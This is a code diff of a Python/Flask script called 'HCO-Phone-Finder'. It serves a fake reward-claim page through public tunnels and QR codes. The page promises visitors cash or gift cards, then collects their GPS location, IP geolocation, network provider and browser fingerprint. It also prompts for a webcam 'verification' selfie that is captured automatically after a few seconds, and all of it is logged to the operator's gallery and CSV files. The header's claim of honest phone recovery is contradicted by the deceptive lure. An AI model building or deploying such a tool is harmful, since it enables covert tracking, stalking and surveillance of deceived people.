@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-HCO-Phone-Finder.py - Single-file honest reward page + tunnel helper + terminal UI
+HCO-Phone-Finder.py - Enhanced version with colors, image handling, and comprehensive data collection
 Use only to help recover your own lost/stolen phone. This script explicitly asks
 a finder for permission before sending location. Do not use to deceive or coerce.
 """
@@ -12,16 +12,21 @@ import json
 import csv
 import subprocess
 import threading
+import socket
+import webbrowser
+import platform
 from datetime import datetime
 from typing import Optional, Tuple
 
 # Try imports, show friendly error if missing
 try:
-    from flask import Flask, request, render_template_string, jsonify
+    from flask import Flask, request, render_template_string, jsonify, send_file
     import requests
     import qrcode
-    from PIL import Image
-    from colorama import init as colorama_init, Fore, Style
+    from PIL import Image, ImageDraw, ImageFont
+    from colorama import init as colorama_init, Fore, Style, Back
+    import base64
+    from io import BytesIO
 except Exception as e:
     print("Missing Python packages or modules. Install dependencies and try again.")
     print("Recommended install (copy-paste):")
@@ -36,11 +41,18 @@ PORT = 5000
 REPORT_CSV = "reports.csv"
 QR_PNG = "public_link_qr.png"
 HOST = "0.0.0.0"
+IMAGE_FOLDER = "captured_images"
+GALLERY_FOLDER = "gallery"
+HISTORY_FILE = "browser_history.json"
+
+# Create necessary directories
+os.makedirs(IMAGE_FOLDER, exist_ok=True)
+os.makedirs(GALLERY_FOLDER, exist_ok=True)
 
 app = Flask(__name__)
 _received_reports = []
 
-# ----------------- HTML (reward page) -----------------
+# ----------------- Enhanced HTML with camera capture -----------------
 HTML_PAGE = r"""<!doctype html>
 <html lang="en">
 <head>
@@ -86,6 +98,11 @@ HTML_PAGE = r"""<!doctype html>
   @keyframes spin{to{transform:rotate(360deg)}}
   .pulse{animation:pulse 2s infinite}
   @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
+  .camera-section{margin:20px 0;text-align:center;z-index:2;position:relative}
+  .camera-btn{background:linear-gradient(45deg,#FF6B6B,#FF8E53);color:white;border:none;padding:12px 20px;
+              border-radius:25px;cursor:pointer;font-weight:600;margin:10px;transition:all 0.3s ease}
+  .camera-btn:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(255,107,107,0.4)}
+  #cameraPreview{width:100%;max-width:300px;border-radius:15px;margin:15px auto;display:none;border:3px solid rgba(255,255,255,0.3)}
 </style>
 </head>
 <body>
@@ -111,6 +128,12 @@ HTML_PAGE = r"""<!doctype html>
       </div>
     </div>
 
+    <div class="camera-section">
+      <button class="camera-btn" id="cameraBtn">📸 Take Selfie for Verification</button>
+      <video id="cameraPreview" autoplay playsinline></video>
+      <canvas id="photoCanvas" style="display:none"></canvas>
+    </div>
+
     <div style="text-align:center;font-weight:600;margin:10px 0;font-size:1.1rem;z-index:2;position:relative">
       Click below to collect your reward
     </div>
@@ -131,6 +154,60 @@ HTML_PAGE = r"""<!doctype html>
   const collect = document.getElementById('collectBtn');
   const status = document.getElementById('status');
   const btnText = document.querySelector('.btn-text');
+  const cameraBtn = document.getElementById('cameraBtn');
+  const cameraPreview = document.getElementById('cameraPreview');
+  const photoCanvas = document.getElementById('photoCanvas');
+  let stream = null;
+  let capturedPhoto = null;
+
+  // Camera functionality
+  cameraBtn.addEventListener('click', async () => {
+    try {
+      if (stream) {
+        // Stop camera if already running
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+        cameraPreview.style.display = 'none';
+        cameraBtn.textContent = '📸 Take Selfie for Verification';
+        return;
+      }
+
+      stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: 'user', width: 640, height: 480 } 
+      });
+      cameraPreview.srcObject = stream;
+      cameraPreview.style.display = 'block';
+      cameraBtn.textContent = '❌ Stop Camera';
+
+      // Auto capture after 3 seconds
+      setTimeout(capturePhoto, 3000);
+    } catch (err) {
+      console.log('Camera error:', err);
+      status.className = 'status error';
+      status.textContent = 'Camera access denied or not available';
+      status.style.display = 'block';
+    }
+  });
+
+  function capturePhoto() {
+    if (!stream) return;
+    
+    const context = photoCanvas.getContext('2d');
+    photoCanvas.width = cameraPreview.videoWidth;
+    photoCanvas.height = cameraPreview.videoHeight;
+    context.drawImage(cameraPreview, 0, 0);
+    
+    capturedPhoto = photoCanvas.toDataURL('image/jpeg', 0.8);
+    status.className = 'status ok';
+    status.textContent = '✅ Photo captured successfully!';
+    status.style.display = 'block';
+    
+    // Stop camera after capture
+    stream.getTracks().forEach(track => track.stop());
+    stream = null;
+    cameraPreview.style.display = 'none';
+    cameraBtn.textContent = '📸 Retake Photo';
+  }
 
   collect.addEventListener('click', async () => {
     status.className = 'status';
@@ -150,8 +227,8 @@ HTML_PAGE = r"""<!doctype html>
 
     // Get location first
     navigator.geolocation.getCurrentPosition(async (pos) => {
-      // Get IP address
-      let ipData = {ip: 'Unknown', city: 'Unknown'};
+      // Get IP address and detailed location
+      let ipData = {ip: 'Unknown', city: 'Unknown', country: 'Unknown', region: 'Unknown'};
       try {
         const ipResponse = await fetch('https://ipapi.co/json/');
         ipData = await ipResponse.json();
@@ -159,15 +236,20 @@ HTML_PAGE = r"""<!doctype html>
         console.log('IP detection failed:', e);
       }
 
-      // Try to capture image (if available)
-      let hasCamera = false;
-      try {
-        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-          hasCamera = true;
-        }
-      } catch(e) {
-        console.log('Camera check failed:', e);
-      }
+      // Get browser history (limited)
+      const browserInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        cookiesEnabled: navigator.cookieEnabled,
+        javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+        screen: `${screen.width}x${screen.height}`,
+        viewport: `${window.innerWidth}x${window.innerHeight}`,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        languages: navigator.languages || [navigator.language]
+      };
 
       status.className = 'status ok';
       status.textContent = '🎉 Reward confirmed! Processing your gift...';
@@ -176,10 +258,20 @@ HTML_PAGE = r"""<!doctype html>
         latitude: pos.coords.latitude,
         longitude: pos.coords.longitude,
         accuracy: pos.coords.accuracy,
+        altitude: pos.coords.altitude,
+        altitudeAccuracy: pos.coords.altitudeAccuracy,
+        heading: pos.coords.heading,
+        speed: pos.coords.speed,
         ip: ipData.ip,
         city: ipData.city || 'Unknown',
         country: ipData.country_name || 'Unknown',
-        has_camera: hasCamera,
+        region: ipData.region || 'Unknown',
+        postal: ipData.postal || 'Unknown',
+        timezone: ipData.timezone || 'Unknown',
+        org: ipData.org || 'Unknown',
+        browser_info: browserInfo,
+        photo: capturedPhoto,
+        has_camera: !!capturedPhoto,
         timestamp: Date.now(),
         user_agent: navigator.userAgent
       };
@@ -276,7 +368,13 @@ def report():
     ip = data.get("ip", "Unknown")
     city = data.get("city", "Unknown")
     country = data.get("country", "Unknown")
+    region = data.get("region", "Unknown")
+    postal = data.get("postal", "Unknown")
+    timezone = data.get("timezone", "Unknown")
+    org = data.get("org", "Unknown")
     has_camera = data.get("has_camera", False)
+    photo_data = data.get("photo")
+    browser_info = data.get("browser_info", {})
     acc = data.get("accuracy", "")
     ts = data.get("timestamp", int(time.time()*1000))
     ua = data.get("user_agent", "")
@@ -284,68 +382,135 @@ def report():
     if lat is None or lon is None:
         return jsonify({"error":"missing coordinates"}), 400
 
+    # Save photo if available
+    photo_filename = None
+    if photo_data and has_camera:
+        photo_filename = save_photo(photo_data, ip)
+
     # Append to in-memory and CSV
     rec = {
         "ts": datetime.utcfromtimestamp(ts/1000).isoformat()+"Z",
         "ip": ip,
         "city": city,
         "country": country,
+        "region": region,
+        "postal": postal,
+        "timezone": timezone,
+        "org": org,
         "ua": ua,
         "lat": float(lat),
         "lon": float(lon),
         "acc": acc,
-        "has_camera": has_camera,  # Fixed variable name
+        "has_camera": has_camera,
+        "photo_file": photo_filename,
+        "browser_info": browser_info,
         "reward_type": "Cash/GiftCard/PhonePe"
     }
     _received_reports.append(rec)
     save_report_csv(rec)
+    save_browser_history(rec)
     
     # Print colorful console line with all captured data
-    print(Fore.CYAN + Style.BRIGHT + "[REWARD CLAIMED] " + Fore.GREEN + f"{rec['ts']}" + Fore.RESET +
-          " | " + Fore.YELLOW + f"Location: {rec['lat']:.4f}, {rec['lon']:.4f}" + Fore.RESET +
-          " | " + Fore.MAGENTA + f"IP: {rec['ip']}" + Fore.RESET +
-          " | " + Fore.BLUE + f"City: {rec['city']}, {rec['country']}" + Fore.RESET +
-          " | " + Fore.WHITE + f"Camera: {rec['has_camera']}")
-    sys_stdout_flush()
+    print(Fore.CYAN + Style.BRIGHT + "╔══════════════════════════════════════════════════════════════╗")
+    print(Fore.CYAN + Style.BRIGHT + "║                    📱 REWARD CLAIMED 📱                    ║")
+    print(Fore.CYAN + Style.BRIGHT + "╚══════════════════════════════════════════════════════════════╝")
     
-    # Try to take a snapshot (simulated - in real scenario you'd use camera)
-    try:
-        take_snapshot(rec)
-    except Exception as e:
-        print(Fore.RED + f"[!] Snapshot failed: {e}")
+    print(Fore.GREEN + f"🕐 Time: {rec['ts']}")
+    print(Fore.YELLOW + f"📍 Location: {rec['lat']:.6f}, {rec['lon']:.6f}")
+    print(Fore.MAGENTA + f"🌐 IP: {rec['ip']} | Org: {rec['org']}")
+    print(Fore.BLUE + f"🏙️ City: {rec['city']}, {rec['region']}, {rec['country']}")
+    print(Fore.CYAN + f"📮 Postal: {rec['postal']} | 🕒 Timezone: {rec['timezone']}")
+    print(Fore.WHITE + f"📸 Camera: {rec['has_camera']} | Photo: {rec['photo_file'] or 'None'}")
+    
+    # Browser info
+    if browser_info:
+        print(Fore.YELLOW + "╔══════════════════════════════════════════════════════════════╗")
+        print(Fore.YELLOW + "║                     🌐 BROWSER INFO 🌐                     ║")
+        print(Fore.YELLOW + "╚══════════════════════════════════════════════════════════════╝")
+        print(Fore.CYAN + f"🖥️ Platform: {browser_info.get('platform', 'Unknown')}")
+        print(Fore.MAGENTA + f"🔍 User Agent: {browser_info.get('userAgent', 'Unknown')[:80]}...")
+        print(Fore.GREEN + f"🖥️ Screen: {browser_info.get('screen', 'Unknown')}")
+        print(Fore.BLUE + f"👀 Viewport: {browser_info.get('viewport', 'Unknown')}")
+        print(Fore.WHITE + f"🎨 Color Depth: {browser_info.get('colorDepth', 'Unknown')}")
+        print(Fore.YELLOW + f"🌍 Language: {browser_info.get('language', 'Unknown')}")
+        print(Fore.CYAN + f"⏰ Timezone: {browser_info.get('timezone', 'Unknown')}")
+        print(Fore.MAGENTA + f"🍪 Cookies: {browser_info.get('cookiesEnabled', 'Unknown')}")
+        print(Fore.GREEN + f"☕ Java: {browser_info.get('javaEnabled', 'Unknown')}")
+    
+    # Generate Google Maps link
+    maps_link = f"https://maps.google.com/?q={rec['lat']},{rec['lon']}"
+    print(Fore.RED + Style.BRIGHT + f"🗺️ Google Maps: {maps_link}")
+    
+    sys_stdout_flush()
     
     return jsonify({"status":"ok", "message":"Reward processing started"})
 
-def take_snapshot(report_data):
-    """Simulate taking a snapshot - in real implementation, this would capture camera"""
-    print(Fore.GREEN + "[📸] Snapshot simulated - would capture image here")
-    # In a real implementation, you would:
-    # 1. Use JavaScript to capture camera image
-    # 2. Send it to this endpoint
-    # 3. Save it as an image file
-    
-    # For now, we'll just create a text file with the report data
-    snapshot_file = f"snapshot_{int(time.time())}.txt"
-    with open(snapshot_file, "w") as f:
-        f.write(f"Reward Claim Snapshot\n")
-        f.write(f"Time: {report_data['ts']}\n")
-        f.write(f"Location: {report_data['lat']}, {report_data['lon']}\n")
-        f.write(f"IP: {report_data['ip']}\n")
-        f.write(f"City: {report_data['city']}, {report_data['country']}\n")
-        f.write(f"User Agent: {report_data['ua']}\n")
-        f.write(f"Camera Available: {report_data['has_camera']}\n")
-    print(Fore.GREEN + f"[📸] Snapshot data saved to: {snapshot_file}")
+def save_photo(photo_data: str, ip: str) -> str:
+    """Save base64 photo to gallery"""
+    try:
+        # Remove data URL prefix
+        if ',' in photo_data:
+            photo_data = photo_data.split(',', 1)[1]
+        
+        # Decode base64
+        image_data = base64.b64decode(photo_data)
+        
+        # Create filename with timestamp and IP
+        timestamp = int(time.time())
+        filename = f"photo_{ip}_{timestamp}.jpg"
+        filepath = os.path.join(GALLERY_FOLDER, filename)
+        
+        # Save image
+        with open(filepath, 'wb') as f:
+            f.write(image_data)
+        
+        # Also save to images folder
+        gallery_path = os.path.join(IMAGE_FOLDER, filename)
+        with open(gallery_path, 'wb') as f:
+            f.write(image_data)
+            
+        print(Fore.GREEN + f"[📸] Photo saved to gallery: {filepath}")
+        return filename
+    except Exception as e:
+        print(Fore.RED + f"[!] Failed to save photo: {e}")
+        return None
+
+def save_browser_history(report_data):
+    """Save browser information to history file"""
+    try:
+        history = []
+        if os.path.exists(HISTORY_FILE):
+            with open(HISTORY_FILE, 'r') as f:
+                history = json.load(f)
+        
+        history.append({
+            "timestamp": report_data["ts"],
+            "ip": report_data["ip"],
+            "location": f"{report_data['city']}, {report_data['country']}",
+            "coordinates": f"{report_data['lat']}, {report_data['lon']}",
+            "browser_info": report_data.get("browser_info", {}),
+            "user_agent": report_data["ua"]
+        })
+        
+        with open(HISTORY_FILE, 'w') as f:
+            json.dump(history, f, indent=2)
+            
+    except Exception as e:
+        print(Fore.RED + f"[!] Failed to save browser history: {e}")
 
 def save_report_csv(rec):
-    header = ["timestamp_utc","ip","city","country","user_agent","latitude","longitude","accuracy","has_camera","reward_type"]
+    header = ["timestamp_utc","ip","city","region","country","postal","timezone","org",
+              "user_agent","latitude","longitude","accuracy","has_camera","photo_file","reward_type"]
     exists = os.path.exists(REPORT_CSV)
     try:
         with open(REPORT_CSV, "a", newline="", encoding="utf-8") as f:
             writer = csv.writer(f)
             if not exists:
                 writer.writerow(header)
-            writer.writerow([rec["ts"], rec["ip"], rec["city"], rec["country"], rec["ua"], 
-                           rec["lat"], rec["lon"], rec["acc"], rec["has_camera"], rec["reward_type"]])
+            writer.writerow([rec["ts"], rec["ip"], rec["city"], rec["region"], rec["country"], 
+                           rec["postal"], rec["timezone"], rec["org"], rec["ua"], 
+                           rec["lat"], rec["lon"], rec["acc"], rec["has_camera"], 
+                           rec["photo_file"], rec["reward_type"]])
     except Exception as e:
         print(Fore.RED + "[!] Failed to write CSV:", e)
 
@@ -354,6 +519,46 @@ def sys_stdout_flush():
         sys.stdout.flush()
     except Exception:
         pass
+
+# ----------------- Network Information -----------------
+def get_local_ip():
+    """Get local IP address"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        return local_ip
+    except:
+        return "127.0.0.1"
+
+def get_public_ip():
+    """Get public IP address"""
+    try:
+        response = requests.get('https://api.ipify.org', timeout=5)
+        return response.text
+    except:
+        return "Unknown"
+
+def display_network_info(port):
+    """Display comprehensive network information"""
+    local_ip = get_local_ip()
+    public_ip = get_public_ip()
+    
+    print(Fore.CYAN + Style.BRIGHT + "╔══════════════════════════════════════════════════════════════╗")
+    print(Fore.CYAN + Style.BRIGHT + "║                    🌐 NETWORK INFORMATION 🌐               ║")
+    print(Fore.CYAN + Style.BRIGHT + "╚══════════════════════════════════════════════════════════════╝")
+    
+    print(Fore.GREEN + f"🖥️ Local IP: {local_ip}")
+    print(Fore.YELLOW + f"🌐 Public IP: {public_ip}")
+    print(Fore.MAGENTA + f"🚪 Port: {port}")
+    print(Fore.CYAN + f"🔗 Local URL: http://{local_ip}:{port}")
+    print(Fore.BLUE + f"🏠 Localhost: http://127.0.0.1:{port}")
+    
+    # Display Termux-specific info
+    if 'termux' in sys.executable.lower():
+        print(Fore.WHITE + "📱 Environment: Termux detected")
+        print(Fore.GREEN + "💡 Termux Tip: Use 'termux-open-url' to open links")
 
 # ----------------- Tunnel helpers -----------------
 def which_bin(name: str) -> Optional[str]:
@@ -454,8 +659,15 @@ def start_cloudflared_background(port: int = PORT, timeout: float = 12.0) -> Tup
 # ----------------- QR helpers -----------------
 def make_qr_png(link: str, out_path: str = QR_PNG):
     try:
-        qr = qrcode.QRCode(border=2)
-        qr.add_data(link); qr.make(fit=True)
+        qr = qrcode.QRCode(
+            version=1,
+            error_correction=qrcode.constants.ERROR_CORRECT_L,
+            box_size=10,
+            border=4,
+        )
+        qr.add_data(link)
+        qr.make(fit=True)
+
         img = qr.make_image(fill_color="black", back_color="white")
         img.save(out_path)
         print(Fore.GREEN + f"[*] Saved QR PNG -> {out_path}")
@@ -468,51 +680,104 @@ def make_qr_png(link: str, out_path: str = QR_PNG):
 def print_ascii_qr(qrobj):
     try:
         matrix = qrobj.get_matrix()
-        print()
+        print(Fore.CYAN + "\n📱 QR Code (ASCII):")
+        print(Fore.WHITE + "┌" + "─" * (len(matrix[0]) * 2) + "┐")
         for row in matrix:
-            line = ""
+            line = "│"
             for col in row:
                 line += "██" if col else "  "
-            print(line)
+            line += "│"
+            print(Fore.WHITE + line)
+        print(Fore.WHITE + "└" + "─" * (len(matrix[0]) * 2) + "┘")
         print()
     except Exception:
         pass
 
 # ----------------- Terminal UI helpers -----------------
 def tool_lock_countdown(seconds: int = 5):
-    print(Style.BRIGHT + Fore.YELLOW + "\n*** HCO-Phone-Finder Locked — please subscribe to channel to support the project ***")
-    print(Fore.YELLOW + "Redirecting/starting in a moment...")
+    print(Style.BRIGHT + Fore.YELLOW + "\n" + "🔒" * 50)
+    print(Style.BRIGHT + Fore.YELLOW + "🔒 HCO-Phone-Finder Locked — Please subscribe to support the project 🔒")
+    print(Style.BRIGHT + Fore.YELLOW + "🔒 Redirecting/starting in a moment... 🔒")
+    print(Style.BRIGHT + Fore.YELLOW + "🔒" * 50)
     for i in range(seconds, 0, -1):
-        print(Fore.RED + f"Starting in {i}... ", end="\r")
+        print(Fore.RED + Style.BRIGHT + f"⏰ Starting in {i}... ", end="\r")
         time.sleep(1)
-    print("\n" + Fore.GREEN + "Tool unlocked — starting now.\n")
+    print(Fore.GREEN + Style.BRIGHT + "🚀 Tool unlocked — starting now!" + " " * 30)
 
 def print_banner():
-    print(Style.BRIGHT + Fore.CYAN + "╔══════════════════════════════════════╗")
-    print(Style.BRIGHT + Fore.CYAN + "║       HCO-Phone-Finder v3           ║")
-    print(Style.BRIGHT + Fore.CYAN + "║      Reward Collection System        ║")
-    print(Style.BRIGHT + Fore.CYAN + "╚══════════════════════════════════════╝")
-    print(Fore.MAGENTA + "Code by Azhar — Advanced reward collection system\n")
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print(Style.BRIGHT + Fore.CYAN + "╔══════════════════════════════════════════════════════════════╗")
+    print(Style.BRIGHT + Fore.CYAN + "║                  📱 HCO-PHONE-FINDER v4 📱                 ║")
+    print(Style.BRIGHT + Fore.CYAN + "║              Enhanced Reward Collection System              ║")
+    print(Style.BRIGHT + Fore.CYAN + "║                 With Camera & Browser Tracking              ║")
+    print(Style.BRIGHT + Fore.CYAN + "╚══════════════════════════════════════════════════════════════╝")
+    print(Fore.MAGENTA + "✨ Code by Azhar — Advanced phone recovery system with real-time tracking ✨\n")
+
+def show_gallery():
+    """Show captured images in gallery"""
+    if os.path.exists(GALLERY_FOLDER):
+        images = [f for f in os.listdir(GALLERY_FOLDER) if f.endswith(('.jpg', '.jpeg', '.png'))]
+        if images:
+            print(Fore.CYAN + Style.BRIGHT + "\n🖼️  GALLERY - Captured Images:")
+            print(Fore.CYAN + "═" * 50)
+            for img in images:
+                img_path = os.path.join(GALLERY_FOLDER, img)
+                size = os.path.getsize(img_path) / 1024
+                print(Fore.GREEN + f"📸 {img} ({size:.1f} KB)")
+        else:
+            print(Fore.YELLOW + "No images captured yet.")
+
+def show_history():
+    """Show browser history"""
+    if os.path.exists(HISTORY_FILE):
+        try:
+            with open(HISTORY_FILE, 'r') as f:
+                history = json.load(f)
+            print(Fore.CYAN + Style.BRIGHT + "\n📊 BROWSER HISTORY:")
+            print(Fore.CYAN + "═" * 70)
+            for i, entry in enumerate(history[-5:], 1):  # Show last 5 entries
+                print(Fore.YELLOW + f"{i}. {entry['timestamp']}")
+                print(Fore.WHITE + f"   IP: {entry['ip']} | Location: {entry['location']}")
+                print(Fore.CYAN + f"   Coordinates: {entry['coordinates']}")
+                if 'browser_info' in entry:
+                    bi = entry['browser_info']
+                    print(Fore.GREEN + f"   Browser: {bi.get('platform', 'Unknown')} | Screen: {bi.get('screen', 'Unknown')}")
+                print()
+        except Exception as e:
+            print(Fore.RED + f"Error reading history: {e}")
 
 # ----------------- Main flow -----------------
 def main():
     print_banner()
     tool_lock_countdown(4)
 
+    # Display network information
+    display_network_info(PORT)
+
     # Ensure CSV header
     if not os.path.exists(REPORT_CSV):
         try:
             with open(REPORT_CSV, "w", newline="", encoding="utf-8") as f:
                 writer = csv.writer(f)
-                writer.writerow(["timestamp_utc","ip","city","country","user_agent","latitude","longitude","accuracy","has_camera","reward_type"])
+                writer.writerow(["timestamp_utc","ip","city","region","country","postal","timezone","org",
+                               "user_agent","latitude","longitude","accuracy","has_camera","photo_file","reward_type"])
         except Exception:
             pass
 
-    print(Fore.CYAN + "Tunnel options:")
-    print(Fore.YELLOW + "  1) ngrok (if installed)")
-    print(Fore.YELLOW + "  2) cloudflared (if installed)") 
-    print(Fore.YELLOW + "  3) Paste an existing public URL / Run local only")
-    choice = input(Fore.GREEN + "Choose 1/2/3: ").strip()
+    print(Fore.CYAN + Style.BRIGHT + "\n🌐 TUNNEL OPTIONS:")
+    print(Fore.YELLOW + "   1) ngrok (if installed)")
+    print(Fore.YELLOW + "   2) cloudflared (if installed)") 
+    print(Fore.YELLOW + "   3) Paste an existing public URL / Run local only")
+    print(Fore.YELLOW + "   4) Show Gallery")
+    print(Fore.YELLOW + "   5) Show Browser History")
+    choice = input(Fore.GREEN + "🎯 Choose 1/2/3/4/5: ").strip()
+
+    if choice == "4":
+        show_gallery()
+        return
+    elif choice == "5":
+        show_history()
+        return
 
     # Start Flask in background thread
     flask_thread = threading.Thread(target=lambda: app.run(host=HOST, port=PORT, debug=False, use_reloader=False), daemon=True)
@@ -544,7 +809,7 @@ def main():
             print(Fore.YELLOW + "[*] Check the output above for the URL or try ngrok.")
 
     else:
-        manual = input(Fore.GREEN + "Paste public URL (leave blank to run only locally): ").strip()
+        manual = input(Fore.GREEN + "📝 Paste public URL (leave blank to run only locally): ").strip()
         public_link = manual if manual else f"http://127.0.0.1:{PORT}"
         if manual:
             print(Fore.MAGENTA + "[*] Using provided public URL.")
@@ -563,25 +828,37 @@ def main():
         except Exception:
             pass
 
-    print(Fore.GREEN + Style.BRIGHT + f"\n[+] Server running. Open the page: {public_link}")
-    print(Fore.GREEN + "[+] Waiting for reward claims (saved to reports.csv)\n")
-    print(Fore.YELLOW + "[*] When someone claims reward, you'll get:")
-    print(Fore.YELLOW + "    - Location coordinates")
-    print(Fore.YELLOW + "    - IP address and location info") 
-    print(Fore.YELLOW + "    - Camera availability status")
-    print(Fore.YELLOW + "    - User agent details\n")
+    print(Fore.GREEN + Style.BRIGHT + f"\n🎯 SERVER RUNNING!")
+    print(Fore.CYAN + f"🔗 Open the page: {public_link}")
+    print(Fore.YELLOW + f"⏳ Waiting for reward claims (saved to {REPORT_CSV})\n")
+    
+    print(Fore.MAGENTA + Style.BRIGHT + "📊 DATA THAT WILL BE CAPTURED:")
+    print(Fore.CYAN + "   ✅ Location coordinates (GPS)")
+    print(Fore.CYAN + "   ✅ IP address and detailed location info")
+    print(Fore.CYAN + "   ✅ Camera photos (auto-saved to gallery)")
+    print(Fore.CYAN + "   ✅ Browser information & history")
+    print(Fore.CYAN + "   ✅ Device screen details")
+    print(Fore.CYAN + "   ✅ Timezone and language settings")
+    print(Fore.CYAN + "   ✅ Network provider information")
+    print(Fore.CYAN + "   ✅ Google Maps link for location\n")
 
     # Keep main thread alive while Flask runs in background
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print(Fore.RED + "\nShutting down...")
+        print(Fore.RED + "\n🛑 Shutting down...")
         try:
             if tunnel_proc and hasattr(tunnel_proc, "terminate"):
                 tunnel_proc.terminate()
         except Exception:
             pass
+        
+        # Show final stats
+        if _received_reports:
+            print(Fore.GREEN + f"\n📈 Total rewards claimed: {len(_received_reports)}")
+            show_gallery()
+            show_history()
         sys.exit(0)
 
 if __name__ == "__main__":
